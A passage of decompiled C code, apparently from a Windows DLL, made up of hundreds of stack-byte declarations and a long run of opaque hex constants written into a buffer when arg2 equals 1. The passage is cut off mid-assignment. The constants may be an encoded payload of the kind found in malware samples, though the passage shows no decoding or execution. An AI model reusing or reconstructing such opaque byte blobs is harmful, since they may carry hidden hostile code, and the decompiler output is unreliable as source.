uchar uStack1068;\n    uchar uStack1067;\n    uchar uStack1066;\n    uchar uStack1065;\n    uchar uStack1064;\n    uchar uStack1063;\n    uchar uStack1062;\n    uchar uStack1061;\n    uchar uStack1060;\n    uchar uStack1059;\n    uchar uStack1058;\n    uchar uStack1057;\n    uchar uStack1056;\n    uchar uStack1055;\n    uchar uStack1054;\n    uchar uStack1053;\n    uchar uStack1052;\n    uchar uStack1051;\n    uchar uStack1050;\n    uchar uStack1049;\n    uchar uStack1048;\n    uchar uStack1047;\n    uchar uStack1046;\n    uchar uStack1045;\n    uchar uStack1044;\n    uchar uStack1043;\n    uchar uStack1042;\n    uchar uStack1041;\n    uchar uStack1040;\n    uchar uStack1039;\n    uchar uStack1038;\n    uchar uStack1037;\n    uchar uStack1036;\n    uchar uStack1035;\n    uchar uStack1034;\n    uchar uStack1033;\n    uchar uStack1032;\n    uchar uStack1031;\n    uchar uStack1030;\n    uchar uStack1029;\n    uchar uStack1028;\n    uchar uStack1027;\n    uchar uStack1026;\n    uchar uStack1025;\n    uchar uStack1024;\n    uchar uStack1023;\n    uchar uStack1022;\n    uchar uStack1021;\n    uchar uStack1020;\n    uchar uStack1019;\n    uchar uStack1018;\n    uchar uStack1017;\n    uchar uStack1016;\n    uchar uStack1015;\n    uchar uStack1014;\n    uchar uStack1013;\n    uchar uStack1012;\n    uchar uStack1011;\n    uchar uStack1010;\n    uchar uStack1009;\n    uchar uStack1008;\n    uchar uStack1007;\n    uchar uStack1006;\n    uchar uStack1005;\n    uchar uStack1004;\n    uchar uStack1003;\n    uchar uStack1002;\n    uchar uStack1001;\n    uchar uStack1000;\n    uchar uStack999;\n    uchar uStack998;\n    uchar uStack997;\n    uchar uStack996;\n    uchar uStack995;\n    uchar uStack994;\n    uchar uStack993;\n    uchar uStack992;\n    uchar uStack991;\n    uchar uStack990;\n    uchar uStack989;\n    uchar uStack988;\n    uchar uStack987;\n    uchar uStack986;\n    uchar uStack985;\n    uchar uStack984;\n    uchar uStack983;\n    uchar uStack982;\n    uchar uStack981;\n    uchar uStack980;\n    uchar uStack979;\n    uchar uStack978;\n    uchar uStack977;\n    uchar uStack976;\n    uchar uStack975;\n    uchar uStack974;\n    uchar uStack973;\n    uchar uStack972;\n    uchar uStack971;\n    uchar uStack970;\n    uchar uStack969;\n    uchar uStack968;\n    uchar uStack967;\n    uchar uStack966;\n    uchar uStack965;\n    uchar uStack964;\n    uchar uStack963;\n    uchar uStack962;\n    uchar uStack961;\n    uchar uStack960;\n    uchar uStack959;\n    uchar uStack958;\n    uchar uStack957;\n    uchar uStack956;\n    uchar uStack955;\n    uchar uStack954;\n    uchar uStack953;\n    uchar uStack952;\n    uchar uStack951;\n    uchar uStack950;\n    uchar uStack949;\n    uchar uStack948;\n    uchar uStack947;\n    uchar uStack946;\n    uchar uStack945;\n    uchar uStack944;\n    uchar uStack943;\n    uchar uStack942;\n    uchar uStack941;\n    uchar uStack940;\n    uchar uStack939;\n    uchar uStack938;\n    uchar uStack937;\n    uchar uStack936;\n    uchar uStack935;\n    uchar uStack934;\n    uchar uStack933;\n    uchar uStack932;\n    uchar uStack931;\n    uchar uStack930;\n    uchar uStack929;\n    uchar uStack928;\n    uchar uStack927;\n    uchar uStack926;\n    uchar uStack925;\n    uchar uStack924;\n    uchar uStack923;\n    uchar uStack922;\n    uchar uStack921;\n    uchar uStack920;\n    uchar uStack919;\n    uchar uStack918;\n    uchar uStack917;\n    uchar uStack916;\n    uchar uStack915;\n    uchar uStack914;\n    uchar uStack913;\n    uchar uStack912;\n    uchar uStack911;\n    uchar uStack910;\n    uchar uStack909;\n    uchar uStack908;\n    uchar uStack907;\n    uchar uStack906;\n    uchar uStack905;\n    uchar uStack904;\n    uchar uStack903;\n    uchar uStack902;\n    uchar uStack901;\n    uchar uStack900;\n    uchar uStack899;\n    uchar uStack898;\n    uchar uStack897;\n    uchar uStack896;\n    uchar uStack895;\n    uchar uStack894;\n    uchar uStack893;\n    uchar uStack892;\n    uchar uStack891;\n    uchar uStack890;\n    uchar uStack889;\n    uchar uStack888;\n    uchar uStack887;\n    uchar uStack886;\n    uchar uStack885;\n    uchar uStack884;\n    uchar uStack883;\n    uchar uStack882;\n    uchar uStack881;\n    uchar uStack880;\n    uchar uStack879;\n    uchar uStack878;\n    uchar uStack877;\n    uchar uStack876;\n    uchar uStack875;\n    uchar uStack874;\n    uchar uStack873;\n    uchar uStack872;\n    uchar uStack871;\n    uchar uStack870;\n    uchar uStack869;\n    uchar uStack868;\n    uchar uStack867;\n    uchar uStack866;\n    uchar uStack865;\n    uchar uStack864;\n    uchar uStack863;\n    uchar uStack862;\n    uchar uStack861;\n    uchar uStack860;\n    uchar uStack859;\n    uchar uStack858;\n    uchar uStack857;\n    uchar uStack856;\n    uchar uStack855;\n    uchar uStack854;\n    uchar uStack853;\n    uchar uStack852;\n    uchar uStack851;\n    uchar uStack850;\n    uchar uStack849;\n    uchar uStack848;\n    uchar uStack847;\n    uchar uStack846;\n    uchar uStack845;\n    uchar uStack844;\n    uchar uStack843;\n    uchar uStack842;\n    uchar uStack841;\n    uchar uStack840;\n    uchar uStack839;\n    uchar uStack838;\n    uchar uStack837;\n    uchar uStack836;\n    uchar uStack835;\n    uchar uStack834;\n    uchar uStack833;\n    uchar uStack832;\n    uchar uStack831;\n    uchar uStack830;\n    uchar uStack829;\n    uchar uStack828;\n    uchar uStack827;\n    uchar uStack826;\n    uchar uStack825;\n    uchar uStack824;\n    uchar uStack823;\n    uchar uStack822;\n    uchar uStack821;\n    uchar uStack820;\n    uchar uStack819;\n    uchar uStack818;\n    uchar uStack817;\n    uchar uStack816;\n    uchar uStack815;\n    uchar uStack814;\n    uchar uStack813;\n    uchar uStack812;\n    uchar uStack811;\n    uchar uStack810;\n    uchar uStack809;\n    uchar uStack808;\n    uchar uStack807;\n    uchar uStack806;\n    uchar uStack805;\n    uchar uStack804;\n    uchar uStack803;\n    uchar uStack802;\n    uchar uStack801;\n    uchar uStack800;\n    uchar uStack799;\n    uchar uStack798;\n    uchar uStack797;\n    uchar uStack796;\n    uchar uStack795;\n    uchar uStack794;\n    uchar uStack793;\n    uchar uStack792;\n    uchar uStack791;\n    uchar uStack790;\n    uchar uStack789;\n    uchar uStack788;\n    uchar uStack787;\n    uchar uStack786;\n    uchar uStack785;\n    uchar uStack784;\n    uchar uStack783;\n    uchar uStack782;\n    uchar uStack781;\n    uchar uStack780;\n    uchar uStack779;\n    uchar uStack778;\n    uchar uStack777;\n    uchar uStack776;\n    uchar uStack775;\n    uchar uStack774;\n    uchar uStack773;\n    uchar uStack772;\n    uchar uStack771;\n    uchar uStack770;\n    uchar uStack769;\n    uchar uStack768;\n    uchar uStack767;\n    uchar uStack766;\n    uchar uStack765;\n    uchar uStack764;\n    uchar uStack763;\n    uchar uStack762;\n    uchar uStack761;\n    uchar uStack760;\n    uchar uStack759;\n    uchar uStack758;\n    uchar uStack757;\n    uchar uStack756;\n    uchar uStack755;\n    uchar uStack754;\n    uchar uStack753;\n    uchar uStack752;\n    uchar uStack751;\n    uchar uStack750;\n    uchar uStack749;\n    uchar uStack748;\n    uchar uStack747;\n    uchar uStack746;\n    uchar uStack745;\n    uchar uStack744;\n    uchar uStack743;\n    uchar uStack742;\n    uchar uStack741;\n    uchar uStack740;\n    uchar uStack739;\n    uchar uStack738;\n    uchar uStack737;\n    uchar uStack736;\n    uchar uStack735;\n    uchar uStack734;\n    uchar uStack733;\n    uchar uStack732;\n    uchar uStack731;\n    uchar uStack730;\n    uchar uStack729;\n    uchar uStack728;\n    uchar uStack727;\n    uchar uStack726;\n    uchar uStack725;\n    uchar uStack724;\n    uchar uStack723;\n    uchar uStack722;\n    uchar uStack721;\n    uchar uStack720;\n    uchar uStack719;\n    uchar uStack718;\n    uchar uStack717;\n    uchar uStack716;\n    uchar uStack715;\n    uchar uStack714;\n    uchar uStack713;\n    uchar uStack712;\n    uchar uStack711;\n    uchar uStack710;\n    uchar uStack709;\n    uchar uStack708;\n    uchar uStack707;\n    uchar uStack706;\n    uchar uStack705;\n    uchar uStack704;\n    uchar uStack703;\n    uchar uStack702;\n    uchar uStack701;\n    uchar uStack700;\n    uchar uStack699;\n    uchar uStack698;\n    uchar uStack697;\n    uchar uStack696;\n    uchar uStack695;\n    uchar uStack694;\n    uchar uStack693;\n    uchar uStack692;\n    uchar uStack691;\n    uchar uStack690;\n    uchar uStack689;\n    uchar uStack688;\n    uchar uStack687;\n    uchar uStack686;\n    uchar uStack685;\n    uchar uStack684;\n    uchar uStack683;\n    uchar uStack682;\n    uchar uStack681;\n    uchar uStack680;\n    uchar uStack679;\n    uchar uStack678;\n    uchar uStack677;\n    uchar uStack676;\n    uchar uStack675;\n    uchar uStack674;\n    uchar uStack673;\n    uchar uStack672;\n    uchar uStack671;\n    uchar uStack670;\n    uchar uStack669;\n    uchar uStack668;\n    uchar uStack667;\n    uchar uStack666;\n    uchar uStack665;\n    uchar uStack664;\n    uchar uStack663;\n    uchar uStack662;\n    uchar uStack661;\n    uchar uStack660;\n    uchar uStack659;\n    uchar uStack658;\n    uchar uStack657;\n    uchar uStack656;\n    uchar uStack655;\n    uchar uStack654;\n    uchar uStack653;\n    uchar uStack652;\n    uchar uStack651;\n    uchar uStack650;\n    uchar uStack649;\n    uchar uStack648;\n    uchar uStack647;\n    uchar uStack646;\n    uchar uStack645;\n    uchar uStack644;\n    uchar uStack643;\n    uchar uStack642;\n    uchar uStack641;\n    uchar uStack640;\n    uchar uStack639;\n    uchar uStack638;\n    uchar uStack637;\n    uchar uStack636;\n    uchar uStack635;\n    uchar uStack634;\n    uchar uStack633;\n    uchar uStack632;\n    uchar uStack631;\n    uchar uStack630;\n    uchar uStack629;\n    uchar uStack628;\n    uchar uStack627;\n    uchar uStack626;\n    uchar uStack625;\n    uchar uStack624;\n    uchar uStack623;\n    uchar uStack622;\n    uchar uStack621;\n    uchar uStack620;\n    uchar uStack619;\n    uchar uStack618;\n    uchar uStack617;\n    uchar uStack616;\n    uchar uStack615;\n    uchar uStack614;\n    uchar uStack613;\n    uchar uStack612;\n    uchar uStack611;\n    uchar uStack610;\n    uchar uStack609;\n    uchar uStack608;\n    uchar uStack607;\n    uchar uStack606;\n    uchar uStack605;\n    uchar uStack604;\n    uchar uStack603;\n    uchar uStack602;\n    uchar uStack601;\n    uchar uStack600;\n    uchar uStack599;\n    uchar uStack598;\n    uchar uStack597;\n    uchar uStack596;\n    uchar uStack595;\n    uchar uStack594;\n    uchar uStack593;\n    uchar uStack592;\n    uchar uStack591;\n    uchar uStack590;\n    uchar uStack589;\n    uchar uStack588;\n    uchar uStack587;\n    uchar uStack586;\n    uchar uStack585;\n    uchar uStack584;\n    uchar uStack583;\n    uchar uStack582;\n    uchar uStack581;\n    uchar uStack580;\n    uchar uStack579;\n    uchar uStack578;\n    uchar uStack577;\n    uchar uStack576;\n    uchar uStack575;\n    uchar uStack574;\n    uchar uStack573;\n    uchar uStack572;\n    uchar uStack571;\n    uchar uStack570;\n    uchar uStack569;\n    uchar uStack568;\n    uchar uStack567;\n    uchar uStack566;\n    uchar uStack565;\n    uchar uStack564;\n    uchar uStack563;\n    uchar uStack562;\n    uchar uStack561;\n    uchar uStack560;\n    uchar uStack559;\n    uchar uStack558;\n    uchar uStack557;\n    uchar uStack556;\n    uchar uStack555;\n    uchar uStack554;\n    uchar uStack553;\n    uchar uStack552;\n    uchar uStack551;\n    uchar uStack550;\n    uchar uStack549;\n    uchar uStack548;\n    uchar uStack547;\n    uchar uStack546;\n    uchar uStack545;\n    uchar uStack544;\n    uchar uStack543;\n    uchar uStack542;\n    uchar uStack541;\n    uchar uStack540;\n    uchar uStack539;\n    uchar uStack538;\n    uchar uStack537;\n    uchar uStack536;\n    uchar uStack535;\n    uchar uStack534;\n    uchar uStack533;\n    uchar uStack532;\n    uchar uStack531;\n    uchar uStack530;\n    uchar uStack529;\n    uchar uStack528;\n    uchar uStack527;\n    uchar uStack526;\n    uchar uStack525;\n    uchar uStack524;\n    uchar uStack523;\n    uchar uStack522;\n    uchar uStack521;\n    uchar uStack520;\n    uchar uStack519;\n    uchar uStack518;\n    uchar uStack517;\n    uchar uStack516;\n    uchar uStack515;\n    uchar uStack514;\n    uchar uStack513;\n    uchar uStack512;\n    uchar uStack511;\n    uchar uStack510;\n    uchar uStack509;\n    uchar uStack508;\n    uchar uStack507;\n    uchar uStack506;\n    uchar uStack505;\n    uchar uStack504;\n    uchar uStack503;\n    uchar uStack502;\n    uchar uStack501;\n    uchar uStack500;\n    uchar uStack499;\n    uchar uStack498;\n    uchar uStack497;\n    uchar uStack496;\n    uchar uStack495;\n    uchar uStack494;\n    uchar uStack493;\n    uchar uStack492;\n    uchar uStack491;\n    uchar uStack490;\n    uchar uStack489;\n    uchar uStack488;\n    uchar uStack487;\n    uchar uStack486;\n    uchar uStack485;\n    uchar uStack484;\n    uchar uStack483;\n    uchar uStack482;\n    uchar uStack481;\n    uchar uStack480;\n    uchar uStack479;\n    uchar uStack478;\n    uchar uStack477;\n    uchar uStack476;\n    uchar uStack475;\n    uchar uStack474;\n    uchar uStack473;\n    uchar uStack472;\n    uchar uStack471;\n    uchar uStack470;\n    uchar uStack469;\n    uchar uStack468;\n    uchar uStack467;\n    uchar uStack466;\n    uchar uStack465;\n    uchar uStack464;\n    uchar uStack463;\n    uchar uStack462;\n    uchar uStack461;\n    uchar uStack460;\n    uchar uStack459;\n    uchar uStack458;\n    uchar uStack457;\n    uchar uStack456;\n    uchar uStack455;\n    uchar uStack454;\n    uchar uStack453;\n    uchar uStack452;\n    uchar uStack451;\n    uchar uStack450;\n    uchar uStack449;\n    uchar uStack448;\n    uchar uStack447;\n    uchar uStack446;\n    uchar uStack445;\n    uchar uStack444;\n    uchar uStack443;\n    uchar uStack442;\n    uchar uStack441;\n    uchar uStack440;\n    uchar uStack439;\n    uchar uStack438;\n    uchar uStack437;\n    uchar uStack436;\n    uchar uStack435;\n    uchar uStack434;\n    uchar uStack433;\n    uchar uStack432;\n    uchar uStack431;\n    uchar uStack430;\n    uchar uStack429;\n    uchar uStack428;\n    uchar uStack427;\n    uchar uStack426;\n    uchar uStack425;\n    uchar uStack424;\n    uchar uStack423;\n    uchar uStack422;\n    uchar uStack421;\n    uchar uStack420;\n    uchar uStack419;\n    uchar uStack418;\n    uchar uStack417;\n    uchar uStack416;\n    uchar uStack415;\n    uchar uStack414;\n    uchar uStack413;\n    uchar uStack412;\n    uchar uStack411;\n    uchar uStack410;\n    uchar uStack409;\n    uchar uStack408;\n    uchar uStack407;\n    uchar uStack406;\n    uchar uStack405;\n    uchar uStack404;\n    uchar uStack403;\n    uchar uStack402;\n    uchar uStack401;\n    uchar uStack400;\n    uchar uStack399;\n    uchar uStack398;\n    uchar uStack397;\n    uchar uStack396;\n    uchar uStack395;\n    uchar uStack394;\n    uchar uStack393;\n    uchar uStack392;\n    uchar uStack391;\n    uchar uStack390;\n    uchar uStack389;\n    uchar uStack388;\n    uchar uStack387;\n    uchar uStack386;\n    uchar uStack385;\n    uchar uStack384;\n    uchar uStack383;\n    uchar uStack382;\n    uchar uStack381;\n    uchar uStack380;\n    uchar uStack379;\n    uchar uStack378;\n    uchar uStack377;\n    uchar uStack376;\n    uchar uStack375;\n    uchar uStack374;\n    uchar uStack373;\n    uchar uStack372;\n    uchar uStack371;\n    uchar uStack370;\n    uchar uStack369;\n    uchar uStack368;\n    uchar uStack367;\n    uchar uStack366;\n    uchar uStack365;\n    uchar uStack364;\n    uchar uStack363;\n    uchar uStack362;\n    uchar uStack361;\n    uchar uStack360;\n    uchar uStack359;\n    uchar uStack358;\n    uchar uStack357;\n    uchar uStack356;\n    uchar uStack355;\n    uchar uStack354;\n    uchar uStack353;\n    uchar uStack352;\n    uchar uStack351;\n    uchar uStack350;\n    uchar uStack349;\n    uchar uStack348;\n    uchar uStack347;\n    uchar uStack346;\n    uchar uStack345;\n    uchar uStack344;\n    uchar uStack343;\n    uchar uStack342;\n    uchar uStack341;\n    uchar uStack340;\n    uchar uStack339;\n    uchar uStack338;\n    uchar uStack337;\n    uchar uStack336;\n    uchar uStack335;\n    uchar uStack334;\n    uchar uStack333;\n    uchar uStack332;\n    uchar uStack331;\n    uchar uStack330;\n    uchar uStack329;\n    uchar uStack328;\n    uchar uStack327;\n    uchar uStack326;\n    uchar uStack325;\n    uchar uStack324;\n    uchar uStack323;\n    uchar uStack322;\n    uchar uStack321;\n    uchar uStack320;\n    uchar uStack319;\n    uchar uStack318;\n    uchar uStack317;\n    uchar uStack316;\n    uchar uStack315;\n    uchar uStack314;\n    uchar uStack313;\n    uchar uStack312;\n    uchar uStack311;\n    uchar uStack310;\n    uchar uStack309;\n    uchar uStack308;\n    uchar uStack307;\n    uchar uStack306;\n    uchar uStack305;\n    uchar uStack304;\n    uchar uStack303;\n    uchar uStack302;\n    uchar uStack301;\n    uchar uStack300;\n    uchar uStack299;\n    uchar uStack298;\n    uchar uStack297;\n    uchar uStack296;\n    uchar uStack295;\n    uchar uStack294;\n    uchar uStack293;\n    uchar uStack292;\n    uchar uStack291;\n    uchar uStack290;\n    uchar uStack289;\n    uchar uStack288;\n    uchar uStack287;\n    uchar uStack286;\n    uchar uStack285;\n    uchar uStack284;\n    uchar uStack283;\n    uchar uStack282;\n    uchar uStack281;\n    uchar uStack280;\n    uchar uStack279;\n    uchar uStack278;\n    uchar uStack277;\n    uchar uStack276;\n    uchar uStack275;\n    uchar uStack274;\n    uchar uStack273;\n    uchar uStack272;\n    uchar uStack271;\n    uchar uStack270;\n    uchar uStack269;\n    uchar uStack268;\n    uchar uStack267;\n    uchar uStack266;\n    uchar uStack265;\n    uchar uStack264;\n    uchar uStack263;\n    uchar uStack262;\n    uchar uStack261;\n    uchar uStack260;\n    uchar uStack259;\n    uchar uStack258;\n    uchar uStack257;\n    uchar uStack256;\n    uchar uStack255;\n    uchar uStack254;\n    uchar uStack253;\n    uchar uStack252;\n    uchar uStack251;\n    uchar uStack250;\n    uchar uStack249;\n    uchar uStack248;\n    uchar uStack247;\n    uchar uStack246;\n    uchar uStack245;\n    uchar uStack244;\n    uchar uStack243;\n    uchar uStack242;\n    uchar uStack241;\n    uchar uStack240;\n    uchar uStack239;\n    uchar uStack238;\n    uchar uStack237;\n    uchar uStack236;\n    uchar uStack235;\n    uchar uStack234;\n    uchar uStack233;\n    uchar uStack232;\n    uchar uStack231;\n    uchar uStack230;\n    uchar uStack229;\n    uchar uStack228;\n    uchar uStack227;\n    uchar uStack226;\n    uchar uStack225;\n    uchar uStack224;\n    uchar uStack223;\n    uchar uStack222;\n    uchar uStack221;\n    uchar uStack220;\n    uchar uStack219;\n    uchar uStack218;\n    uchar uStack217;\n    uchar uStack216;\n    uchar uStack215;\n    uchar uStack214;\n    uchar uStack213;\n    uchar uStack212;\n    uchar uStack211;\n    uchar uStack210;\n    uchar uStack209;\n    uchar uStack208;\n    uchar uStack207;\n    uchar uStack206;\n    uchar uStack205;\n    uchar uStack204;\n    uchar uStack203;\n    uchar uStack202;\n    uchar uStack201;\n    uchar uStack200;\n    uchar uStack199;\n    uchar uStack198;\n    uchar uStack197;\n    uchar uStack196;\n    uchar uStack195;\n    uchar uStack194;\n    uchar uStack193;\n    uchar uStack192;\n    uchar uStack191;\n    uchar uStack190;\n    uchar uStack189;\n    uchar uStack188;\n    uchar uStack187;\n    uchar uStack186;\n    uchar uStack185;\n    uchar uStack184;\n    uchar uStack183;\n    uchar uStack182;\n    uchar uStack181;\n    uchar uStack180;\n    uchar uStack179;\n    uchar uStack178;\n    uchar uStack177;\n    uchar uStack176;\n    uchar uStack175;\n    uchar uStack174;\n    uchar uStack173;\n    uchar uStack172;\n    uchar uStack171;\n    uchar uStack170;\n    uchar uStack169;\n    uchar uStack168;\n    uchar uStack167;\n    uchar uStack166;\n    uchar uStack165;\n    uchar uStack164;\n    uchar uStack163;\n    uchar uStack162;\n    uchar uStack161;\n    uchar uStack160;\n    uchar uStack159;\n    uchar uStack158;\n    uchar uStack157;\n    uchar uStack156;\n    uchar uStack155;\n    uchar uStack154;\n    uchar uStack153;\n    uchar uStack152;\n    uchar uStack151;\n    uchar uStack150;\n    uchar uStack149;\n    uchar uStack148;\n    uchar uStack147;\n    uchar uStack146;\n    uchar uStack145;\n    uchar uStack144;\n    uchar uStack143;\n    uchar uStack142;\n    uchar uStack141;\n    uchar uStack140;\n    uchar uStack139;\n    uchar uStack138;\n    uchar uStack137;\n    uchar uStack136;\n    uchar uStack135;\n    uchar uStack134;\n    uchar uStack133;\n    uchar uStack132;\n    uchar uStack131;\n    uchar uStack130;\n    uchar uStack129;\n    uchar uStack128;\n    uchar uStack127;\n    uchar uStack126;\n    uchar uStack125;\n    uchar uStack124;\n    uchar uStack123;\n    uchar uStack122;\n    uchar uStack121;\n    uchar uStack120;\n    uchar uStack119;\n    uchar uStack118;\n    uchar uStack117;\n    uchar uStack116;\n    uchar uStack115;\n    uchar uStack114;\n    uchar uStack113;\n    uchar uStack112;\n    uchar uStack111;\n    uchar uStack110;\n    uchar uStack109;\n    uchar uStack108;\n    uchar uStack107;\n    uchar uStack106;\n    uchar uStack105;\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uchar uStack100;\n    uchar uStack99;\n    uchar uStack98;\n    uchar uStack97;\n    uchar uStack96;\n    uchar uStack95;\n    uchar uStack94;\n    uchar uStack93;\n    uchar uStack92;\n    uchar uStack91;\n    uchar uStack90;\n    uchar uStack89;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack85;\n    uchar uStack84;\n    uchar uStack83;\n    uchar uStack82;\n    uchar uStack81;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack76;\n    uchar uStack75;\n    uchar uStack74;\n    uchar uStack73;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    uchar uStack52;\n    uchar uStack51;\n    uchar uStack50;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uchar uStack45;\n    uchar uStack44;\n    uint64_t uStack40;\n    \n    uStack40 = *0x180067ce0 ^ auStack3048;\n    if (arg2 == 1) {\n        auStack3016[0] = 0x77;\n        auStack3016[1] = 0xda;\n        auStack3016[2] = 0x7c;\n        auStack3016[3] = 0x1d;\n        uStack3012 = 0x6d;\n        uStack2977 = 0;\n        uStack3011 = 0x33;\n        uStack3010 = 0x17;\n        uStack3009 = 0x1b;\n        uStack3008 = 0x13;\n        uStack3007 = 0x2c;\n        uStack3006 = 1;\n        uStack3005 = 0x35;\n        uStack3004 = 0x3c;\n        uStack3003 = 0x65;\n        uStack3002 = 0x69;\n        uStack3001 = 7;\n        uStack3000 = 0x10;\n        uStack2999 = 0x23;\n        uStack2998 = 0xd5;\n        uStack2997 = 0xfc;\n        uStack2996 = 0x42;\n        uStack2995 = 0x1d;\n        uStack2994 = 0x88;\n        uStack2993 = 0xd9;\n        uStack2992 = 0x8f;\n        uStack2991 = 0x1f;\n        uStack2990 = 0xea;\n        uStack2989 = 0xa7;\n        uStack2988 = 0x9f;\n        uStack2987 = 0x4d;\n        uStack2986 = 0x71;\n        uStack2985 = 0x58;\n        uStack2984 = 0x59;\n        uStack2983 = 0xf6;\n        uStack2982 = 199;\n        uStack2981 = 0x7a;\n        uStack2980 = 0x5b;\n        uStack2979 = 0x5b;\n        uStack2978 = 0x39;\n        uStack2976 = 0x66;\n        uStack2975 = 8;\n        uStack2974 = 0xc6;\n        uStack2973 = 0xad;\n        uStack2972 = 0x25;\n        uStack2971 = 0xdc;\n        uStack2970 = 0x31;\n        uStack2969 = 0x2b;\n        uStack2968 = 0x17;\n        uStack2967 = 0xf6;\n        uStack2966 = 0xcf;\n        uStack2965 = 2;\n        uStack2964 = 0x21;\n        uStack2963 = 0x10;\n        uStack2962 = 0xd9;\n        uStack2961 = 0x2b;\n        uStack2960 = 0xd;\n        uStack2959 = 0x3f;\n        uStack2958 = 0xaf;\n        uStack2957 = 0x3d;\n        uStack2956 = 0x57;\n        uStack2955 = 0x23;\n        uStack2954 = 0xc2;\n        uStack2953 = 0x1a;\n        uStack2952 = 0x74;\n        uStack2951 = 0x35;\n        uStack2950 = 0xd5;\n        uStack2949 = 0x2b;\n        uStack2948 = 0x53;\n        uStack2947 = 0x48;\n        uStack2946 = 0xb6;\n        uStack2945 = 0x1e;\n        uStack2944 = 0x48;\n        uStack2943 = 0x71;\n        uStack2942 = 0xec;\n        uStack2941 = 0x2b;\n        uStack2940 = 0x74;\n        uStack2939 = 5;\n        uStack2938 = 0xcd;\n        uStack2937 = 0x20;\n        uStack2936 = 0x75;\n        uStack2935 = 0x3c;\n        uStack2934 = 0xe0;\n        uStack2933 = 0xa9;\n        uStack2932 = 0xbf;\n        uStack2931 = 0x46;\n        uStack2930 = 0x47;\n        uStack2929 = 0x6b;\n        uStack2928 = 0x10;\n        uStack2927 = 0xd9;\n        uStack2926 = 0x2b;\n        uStack2925 = 0x75;\n        uStack2924 = 0x3f;\n        uStack2923 = 0xaf;\n        uStack2922 = 0x3d;\n        uStack2921 = 0xf;\n        uStack2920 = 0x23;\n        uStack2919 = 0xc2;\n        uStack2918 = 0x1a;\n        uStack2917 = 0x2c;\n        uStack2916 = 0x39;\n        uStack2915 = 0xd1;\n        uStack2914 = 0x27;\n        uStack2913 = 0x5e;\n        uStack2912 = 0x48;\n        uStack2911 = 0xb6;\n        uStack2910 = 0x1e;\n        uStack2909 = 0x40;\n        uStack2908 = 0x5f;\n        uStack2907 = 0xec;\n        uStack2906 = 0x2b;\n        uStack2905 = 4;\n        uStack2904 = 0x2b;\n        uStack2903 = 0xcd;\n        uStack2902 = 0x21;\n        uStack2901 = 0x71;\n        uStack2900 = 0x54;\n        uStack2899 = 0xd0;\n        uStack2898 = 0x37;\n        uStack2897 = 0xa3;\n        uStack2896 = 0xf9;\n        uStack2895 = 0xfa;\n        uStack2894 = 0x2f;\n        uStack2893 = 0xd0;\n        uStack2892 = 0x15;\n        uStack2891 = 0x9a;\n        uStack2890 = 0x61;\n        uStack2889 = 0xff;\n        uStack2888 = 99;\n        uStack2887 = 0x92;\n        uStack2886 = 0x31;\n        uStack2885 = 0xe2;\n        uStack2884 = 0xe;\n        uStack2883 = 0x19;\n        uStack2882 = 4;\n        uStack2881 = 0xf8;\n        uStack2880 = 0x1c;\n        uStack2879 = 0x4e;\n        uStack2878 = 0x14;\n        uStack2877 = 0x89;\n        uStack2876 = 0x7b;\n        uStack2875 = 0x77;\n        uStack2874 = 0x1a;\n        uStack2873 = 0x5f;\n        uStack2872 = 0xec;\n        uStack2871 = 0x22;\n        uStack2870 = 0x60;\n        uStack2869 = 99;\n        uStack2868 = 0x83;\n        uStack2867 = 0x28;\n        uStack2866 = 0x59;\n        uStack2865 = 6;\n        uStack2864 = 0x69;\n        uStack2863 = 0x4a;\n        uStack2862 = 0x3f;\n        uStack2861 = 0x81;\n        uStack2860 = 2;\n        uStack2859 = 0x7b;\n        uStack2858 = 0x3d;\n        uStack2857 = 0x50;\n        uStack2856 = 10;\n        uStack2855 = 0x25;\n        uStack2854 = 0xb0;\n        uStack2853 = 99;\n        uStack2852 = 100;\n        uStack2851 = 100;\n        uStack2850 = 0x6b;\n        uStack2849 = 0x79;\n        uStack2848 = 0x57;\n        uStack2847 = 0x8b;\n        uStack2846 = 0x34;\n        uStack2845 = 0x40;\n        uStack2844 = 0x44;\n        uStack2843 = 0x36;\n        uStack2842 = 100;\n        uStack2841 = 0x3f;\n        uStack2840 = 0x94;\n        uStack2839 = 0x75;\n        uStack2838 = 0x25;\n        uStack2837 = 9;\n        uStack2836 = 0x66;\n        uStack2835 = 0x28;\n        uStack2834 = 0x4d;\n        uStack2833 = 0x83;\n        uStack2832 = 0xe8;\n        uStack2831 = 0x7d;\n        uStack2830 = 0x75;\n        uStack2829 = 0x69;\n        uStack2828 = 0x24;\n        uStack2827 = 0x6c;\n        uStack2826 = 0x2a;\n        uStack2825 = 0x22;\n        uStack2824 = 0xe;\n        uStack2823 = 0x9e;\n        uStack2822 = 0xd5;\n        uStack2821 = 0x4a;\n        uStack2820 = 0x24;\n        uStack2819 = 0x77;\n        uStack2818 = 0x26;\n        uStack2817 = 0;\n        uStack2816 = 0x90;\n        uStack2815 = 0x2f;\n        uStack2814 = 0x6f;\n        uStack2813 = 0x1f;\n        uStack2812 = 0;\n        uStack2811 = 0x1e;\n        uStack2810 = 0x39;\n        uStack2809 = 0xe;\n        uStack2808 = 0xf1;\n        uStack2807 = 0x44;\n        uStack2806 = 0x1b;\n        uStack2805 = 0x1f;\n        uStack2804 = 0x7c;\n        uStack2803 = 0x50;\n        uStack2802 = 7;\n        uStack2801 = 0x14;\n        uStack2800 = 0x83;\n        uStack2799 = 9;\n        uStack2798 = 0x60;\n        uStack2797 = 0x3d;\n        uStack2796 = 0x34;\n        uStack2795 = 6;\n        uStack2794 = 0x10;\n        uStack2793 = 0x65;\n        uStack2792 = 0xf8;\n        uStack2791 = 2;\n        uStack2790 = 99;\n        uStack2789 = 0x53;\n        uStack2788 = 0xe;\n        uStack2787 = 0x39;\n        uStack2786 = 0x14;\n        uStack2785 = 0x51;\n        uStack2784 = 0xb0;\n        uStack2783 = 0x62;\n        uStack2782 = 0x54;\n        uStack2781 = 0x6b;\n        